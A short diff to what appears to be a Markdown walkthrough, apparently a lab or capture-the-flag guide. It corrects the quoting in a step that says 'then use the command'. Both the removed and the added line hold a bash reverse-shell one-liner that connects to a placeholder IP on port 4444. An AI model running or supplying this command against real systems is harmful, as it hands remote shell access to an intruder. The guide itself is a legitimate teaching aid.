@@ -5,5 +5,5 @@
 ```
 - then use the command
 ```shell
-/bin/bash -c '/bin/bash -i >& /dev/tcp/<your_IP>/4444 0>&1"
+/bin/bash -c '/bin/bash -i >& /dev/tcp/<your_IP>/4444 0>&1'
 ```
